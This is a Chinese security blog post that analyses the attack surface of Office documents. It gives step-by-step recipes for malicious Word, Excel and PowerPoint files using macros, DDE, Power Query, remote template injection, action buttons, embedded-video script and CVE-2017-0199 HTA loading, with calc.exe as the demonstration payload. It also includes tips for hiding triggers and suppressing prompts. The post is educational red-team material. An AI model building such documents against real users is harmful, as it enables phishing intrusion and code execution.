<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="office文档攻击面分析通过office文档来投递载荷是常见的攻击方式，无论是APT组织还是平时的红蓝对抗、攻防演习，都喜欢通过这种方式打开一个入口。大致流程是：以邮件为载体，伪装成正常的邮件内容，附件带上精心构造好的漏洞office文档，收信人打开阅读就会触发恶意的代码，沦陷中招。office恶意文档的构造利用方式也是多种多样的，如宏、DDE协议、Power Query、模板注入、ppt动作按">
<meta name="keywords" content="office">
<meta property="og:type" content="article">
<meta property="og:title" content="office文档攻击面分析">
<meta property="og:url" content="http:&#x2F;&#x2F;zerokeeper.github.io&#x2F;web-security&#x2F;office-document-attack-surface.html">
<meta property="og:site_name" content="ZeroKeeper">
<meta property="og:description" content="office文档攻击面分析通过office文档来投递载荷是常见的攻击方式，无论是APT组织还是平时的红蓝对抗、攻防演习，都喜欢通过这种方式打开一个入口。大致流程是：以邮件为载体，伪装成正常的邮件内容，附件带上精心构造好的漏洞office文档，收信人打开阅读就会触发恶意的代码，沦陷中招。office恶意文档的构造利用方式也是多种多样的，如宏、DDE协议、Power Query、模板注入、ppt动作按">
<meta property="og:locale" content="en">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;10&#x2F;15968197407133.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;07&#x2F;15965960364668.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;07&#x2F;15965961955882.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;07&#x2F;15965964775314.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;07&#x2F;15965979136330.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;07&#x2F;15965979765187.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;07&#x2F;15965980185783.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;10&#x2F;15968154222023.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;10&#x2F;15968152741196.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;10&#x2F;15968157985608.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;07&#x2F;15966136405232.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;07&#x2F;15966080651010.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;07&#x2F;15966116642265.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;07&#x2F;15966116790346.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;07&#x2F;15966124704301.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;07&#x2F;15966125762207.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;07&#x2F;15968061516619.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;07&#x2F;15968065008635.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;07&#x2F;15968064397121.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;07&#x2F;embedded.gif">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;07&#x2F;15967074800303.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;07&#x2F;15967078875693.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;07&#x2F;15967880432630.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;07&#x2F;OfficePackageMonikerExecution.gif">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;07&#x2F;15966215656488.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;07&#x2F;15967859488655.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;07&#x2F;EQNEDT-Execution.gif">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;07&#x2F;15967845604270.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;07&#x2F;15967864812509.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;07&#x2F;15967865638924.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;07&#x2F;15967864359921.jpg">
<meta property="og:updated_time" content="2021-03-31T02:09:41.657Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2020&#x2F;08&#x2F;10&#x2F;15968197407133.jpg">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>office文档攻击面分析</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" href="/writeup/pwnabletw-hacknote-wp.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zerokeeper.github.io/web-security/office-document-attack-surface.html" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://zerokeeper.github.io/web-security/office-document-attack-surface.html&text=office文档攻击面分析" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zerokeeper.github.io/web-security/office-document-attack-surface.html&title=office文档攻击面分析" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zerokeeper.github.io/web-security/office-document-attack-surface.html&is_video=false&description=office文档攻击面分析" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=office文档攻击面分析&body=Check out this article: http://zerokeeper.github.io/web-security/office-document-attack-surface.html" target="_blank" rel="noopener"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://zerokeeper.github.io/web-security/office-document-attack-surface.html&title=office文档攻击面分析" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://zerokeeper.github.io/web-security/office-document-attack-surface.html&title=office文档攻击面分析" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zerokeeper.github.io/web-security/office-document-attack-surface.html&title=office文档攻击面分析" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://zerokeeper.github.io/web-security/office-document-attack-surface.html&title=office文档攻击面分析" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zerokeeper.github.io/web-security/office-document-attack-surface.html&name=office文档攻击面分析&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#office文档攻击面分析"><span class="toc-number">1.</span> <span class="toc-text">office文档攻击面分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#office文档格式"><span class="toc-number">1.1.</span> <span class="toc-text">office文档格式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#宏"><span class="toc-number">1.2.</span> <span class="toc-text">宏</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理"><span class="toc-number">1.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用"><span class="toc-number">1.2.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DDE"><span class="toc-number">1.3.</span> <span class="toc-text">DDE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-1"><span class="toc-number">1.3.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Power-Query"><span class="toc-number">1.4.</span> <span class="toc-text">Power Query</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#原理-2"><span class="toc-number">1.5.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-2"><span class="toc-number">1.5.1.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#模板注入"><span class="toc-number">1.6.</span> <span class="toc-text">模板注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理-3"><span class="toc-number">1.6.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-3"><span class="toc-number">1.6.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PPT动作按钮"><span class="toc-number">1.7.</span> <span class="toc-text">PPT动作按钮</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理-4"><span class="toc-number">1.7.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-4"><span class="toc-number">1.7.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内嵌视频"><span class="toc-number">1.8.</span> <span class="toc-text">内嵌视频</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理-5"><span class="toc-number">1.8.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-5"><span class="toc-number">1.8.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#插入外部对象（OLE2link）"><span class="toc-number">1.9.</span> <span class="toc-text">插入外部对象（OLE2link）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理-6"><span class="toc-number">1.9.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-6"><span class="toc-number">1.9.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Package-Moniker"><span class="toc-number">1.10.</span> <span class="toc-text">Package Moniker</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理-7"><span class="toc-number">1.10.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-7"><span class="toc-number">1.10.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#公式编辑器漏洞"><span class="toc-number">1.11.</span> <span class="toc-text">公式编辑器漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理-8"><span class="toc-number">1.11.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-8"><span class="toc-number">1.11.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">1.12.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">1.13.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        office文档攻击面分析
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">ZeroKeeper</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-08-12T11:13:00.000Z" itemprop="datePublished">2020-08-12</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/web-security/">web-security</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/office/" rel="tag">office</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="office文档攻击面分析"><a href="#office文档攻击面分析" class="headerlink" title="office文档攻击面分析"></a>office文档攻击面分析</h1><p>通过office文档来投递载荷是常见的攻击方式，无论是APT组织还是平时的红蓝对抗、攻防演习，都喜欢通过这种方式打开一个入口。大致流程是：以邮件为载体，伪装成正常的邮件内容，附件带上精心构造好的漏洞office文档，收信人打开阅读就会触发恶意的代码，沦陷中招。office恶意文档的构造利用方式也是多种多样的，如宏、DDE协议、Power Query、模板注入、ppt动作按钮、内嵌视频、OLE2link、Package Moniker加载、公式编辑器等，下面就对各种利用方法做进一步的分析。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/10/15968197407133.jpg" alt="-w950"></p>
<h2 id="office文档格式"><a href="#office文档格式" class="headerlink" title="office文档格式"></a>office文档格式</h2><p>office文档格式分为两种，一种是2007之前的版本，文档格式是OLESS（OLE Structured Storage），它是一种对象链接和嵌入的技术，该技术可以包含文本，图形，电子表格甚至其他二进制数据。2007以及之后的版本采用OpenXML格式，实际是压缩文件，可以直接通过压缩工具解压查看。详细介绍可参考<a href="https://zhuanlan.zhihu.com/p/31345299" target="_blank" rel="noopener">Office恶意文件解析与混淆研究</a></p>
<h2 id="宏"><a href="#宏" class="headerlink" title="宏"></a>宏</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>宏文档是最常见的office攻击文档，<a href="https://support.microsoft.com/zh-cn/office/%e5%90%af%e7%94%a8%e6%88%96%e7%a6%81%e7%94%a8-office-%e6%96%87%e4%bb%b6%e4%b8%ad%e7%9a%84%e5%ae%8f-12b036fd-d140-4e74-b45e-16fed1a7e5c6?ui=zh-cn&rs=zh-cn&ad=cn" target="_blank" rel="noopener">官方解释</a>宏是可用于自动执行某一重复任务的一系列命令，可在您必须执行该任务时运行。宏文档成功的关键是欺骗用户允许启用宏。</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>环境：win7+office2010<br>新建一个普通的word文档，视图=&gt;宏<br>宏名字:AutoOpen<br>宏位置：当前文件名的文档<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/07/15965960364668.jpg" alt="-w808"></p>
<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/07/15965961955882.jpg" alt="-w866"><br>在宏编辑器窗口，插入代码，关闭编辑器窗口</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">Sub</span> <span class="function"><span class="title">AutoOpen</span>()</span></span><br><span class="line"><span class="function"><span class="title">Shell</span>(<span class="string">"cmd.exe /c calc.exe"</span>)</span></span><br><span class="line"><span class="variable">End</span> <span class="variable">Sub</span></span><br></pre></td></tr></table></figure>
<p>文件另存为启用宏的文档，打开文档，提示启用宏，允许就会触发宏执行代码<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/07/15965964775314.jpg" alt="-w839"></p>
<h2 id="DDE"><a href="#DDE" class="headerlink" title="DDE"></a>DDE</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>DDE(动态数据交换)，Windows为应用之间进行数据传输提供了多种传输方式，其中一种叫做动态交换协议，我们简称它为DDE协议。DDE协议其实就是一套信息与指导参考。它在共享数据的应用程序之间发送消息，并使用共享内存在应用程序之间进行数据交换。应用程序可以使用DDE协议进行一次性数据传输和持续交换，应用程序在新的数据可用时，会将更新发送给彼此。通过自定义DDE字段，插入执行代码。通过使用DDE可以在不启用宏的情况下执行命令。</p>
<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>环境：win7+office2010<br>新建Word文档，Ctrl+F9添加一个域，然后修改域代码为</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDEAUTO c:\\windows\\system32\\<span class="keyword">cmd</span>.<span class="bash">exe <span class="string">"/k calc.exe"</span></span></span><br></pre></td></tr></table></figure>
<p>更新域，保存文件<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/07/15965979136330.jpg" alt="-w677"></p>
<p>重新打开文档，提示更新文档<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/07/15965979765187.jpg" alt="-w507"></p>
<p>选择是，命令执行成功，不足之处是有两次弹窗确认。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/07/15965980185783.jpg" alt="-w736"></p>
<h2 id="Power-Query"><a href="#Power-Query" class="headerlink" title="Power Query"></a>Power Query</h2><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>利用Excel中的Power Query功能动态启动针对Excel电子表格的远程DDE攻击，可利用Power Query来释放payload或收集信息。</p>
<h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><p>环境：win10+office2013<br>在web服务器新建一个文本文件PowerQuery.txt，内容：<br><code>=cmd|&#39;/c calc.exe&#39;!A1,</code><br>然后execel表格使用Power Query来查询我们构造的恶意web页面。<br>数据=&gt;来自网站=&gt;url地址=&gt;转到=&gt;导入=保存文件<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/10/15968154222023.jpg" alt="-w770"></p>
<p>重新打开会有安全提示，点击启用内容，然后只要点击表格的任意位置就会触发执行代码。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/10/15968152741196.jpg" alt="-w852"><br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/10/15968157985608.jpg" alt="-w1207"></p>
<p>实际环境中可把表格位置放在隐蔽位置，别放到A1。</p>
<h2 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>word模板注入是利用Word文档加载附加模板时的缺陷,加载的模板是带宏的恶意模板，从而间接执行宏代码。模板注入分为远程和本地模板，远程通过http协议加载模板，本地可以通过file协议加载，实战中大部分都是远程加载。</p>
<h3 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h3><p>环境：win7+office2010<br>先创建一个启用宏的dotm文件</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">Sub</span> <span class="function"><span class="title">AutoOpen</span>()</span></span><br><span class="line"><span class="function"><span class="title">Shell</span>(<span class="string">"cmd.exe /c calc.exe"</span>)</span></span><br><span class="line"><span class="variable">End</span> <span class="variable">Sub</span></span><br></pre></td></tr></table></figure>
<p>将宏文档部署到web服务器上，再创建一个docx文件，选用一个word的模板，然后将docx用压缩工具打开，修改修改./word/_rels/settings.xml.rels文件的Target地址<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/07/15966136405232.jpg" alt="-w922"></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml <span class="attribute">version</span>=<span class="string">"1.0"</span> <span class="attribute">encoding</span>=<span class="string">"UTF-8"</span> <span class="attribute">standalone</span>=<span class="string">"yes"</span>?&gt;</span><br><span class="line">&lt;Relationships <span class="attribute">xmlns</span>=<span class="string">"http://schemas.openxmlformats.org/package/2006/relationships"</span>&gt;&lt;Relationship <span class="attribute">Id</span>=<span class="string">"rId1"</span> <span class="attribute">Type</span>=<span class="string">"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"</span> <span class="attribute">Target</span>=<span class="string">"https://example.com/OfficeRemoteTemplateInject.dotm"</span> <span class="attribute">TargetMode</span>=<span class="string">"External"</span>/&gt;&lt;/Relationships&gt;</span><br></pre></td></tr></table></figure>
<p>打开修改后的docx文件，就会远程加载启用了宏的文件</p>
<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/07/15966080651010.jpg" alt="-w896"></p>
<h2 id="PPT动作按钮"><a href="#PPT动作按钮" class="headerlink" title="PPT动作按钮"></a>PPT动作按钮</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>利用ppt的动作按钮内置功能，执行恶意代码</p>
<h3 id="利用-4"><a href="#利用-4" class="headerlink" title="利用"></a>利用</h3><p>环境：win7+office2010<br>新建ppt文档，创建内容，选择动作</p>
<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/07/15966116642265.jpg" alt="-w602"></p>
<p>选择鼠标移过，允许程序：<br><code>C:\Windows\System32\calc.exe</code><br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/07/15966116790346.jpg" alt="-w557"><br>文档保存为ppsx文档，重新打开，当鼠标滑过内容时，会弹出来一个安全提示，选择启用就会执行指定的代码</p>
<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/07/15966124704301.jpg" alt="-w594"></p>
<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/07/15966125762207.jpg" alt="-w529"></p>
<h2 id="内嵌视频"><a href="#内嵌视频" class="headerlink" title="内嵌视频"></a>内嵌视频</h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p>在 Word 文档中嵌入视频时, 将创建一个HTML脚本, 并在单击文档中的缩略图时IE浏览器执行它。攻击者通过编辑文档的xml文件，将视频链接替换为恶意js代码，缩略图显示的仍然是被嵌入的在线视频链接,。播放视频执行的却是被替换为恶意js代码。代码会用msSaveOrOpenBlob方法打开有运行或保存文件选项的IE下载管理器来触发下载可执行文件。</p>
<h3 id="利用-5"><a href="#利用-5" class="headerlink" title="利用"></a>利用</h3><p>环境：win7+office2013<br>当用户点击播放恶意Office文档中嵌入的恶意的视频时，可在机器上执行在document.xml中的JavaScript代码。</p>
<p>新建word文档，插入=&gt;联机视频，选择一段youtube视频，或者直接找一个视频链接嵌入也可以。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/07/15968061516619.jpg" alt="-w903"></p>
<p>保存文档，用压缩工具打开编辑word/document.xml<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/07/15968065008635.jpg" alt="-w563"></p>
<p>找到含有Youtube iframe代码的embeddedHtml参数，用想要执行的html或JS代码替换当前iframe代码<br><code>embeddedHtml=&quot;&amp;lt;script src=&amp;quot;https://static-1257872780.cos.ap-shanghai.myqcloud.com/test/embedded.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&quot;/&gt;</code></p>
<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/07/15968064397121.jpg" alt="-w1113"><br>保存修改后的document.xml文件，更新word文档。重新打开word文档。<br>效果如下：<br>点击播放视频，弹出下载管理器保存或运行payload的用户弹窗，伪装成Flash Player更新，欺骗用户点击执行。</p>
<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/07/embedded.gif" alt=""></p>
<h2 id="插入外部对象（OLE2link）"><a href="#插入外部对象（OLE2link）" class="headerlink" title="插入外部对象（OLE2link）"></a>插入外部对象（OLE2link）</h2><h3 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h3><p>利用Office OLE对象链接技术，将恶意的链接对象嵌入正常的RTF文件中，当打开文档时会下载并执行远程的恶意文件。</p>
<h3 id="利用-6"><a href="#利用-6" class="headerlink" title="利用"></a>利用</h3><p>环境：win10+office2013<br>代表漏洞有CVE-2017-0199、CVE-2017-8759，这里以CVE-2017-0199为例。<br>在web网站根目录下新建一个rtf文件内容任意,命名ms.rtf 。然后新建一个word文档，插入=&gt;对象=&gt;由文件创建=&gt;链接到文件=&gt;ms.rtf的地址，再将word另存为rtf格式，文件名为exp.rtf<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/07/15967074800303.jpg" alt="-w850"></p>
<p>再将ms.rtf内容改为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var a = new ActiveXObject(&quot;wscript.shell&quot;);</span><br><span class="line">a.Run(&quot;%SystemRoot%\\system32\\calc.exe&quot;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>此时设置服务器的文件的header头Content-Type改为application/hta</p>
<p>去掉弹窗确认，再用编辑器打开exp.rtf，将\object\objautlink\rsltpict修改为\object\objautlink\objupdate\rsltpict,保存文档，重新打开就会直接运行远程的hta脚本，无需确认。</p>
<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/07/15967078875693.jpg" alt="-w1012"></p>
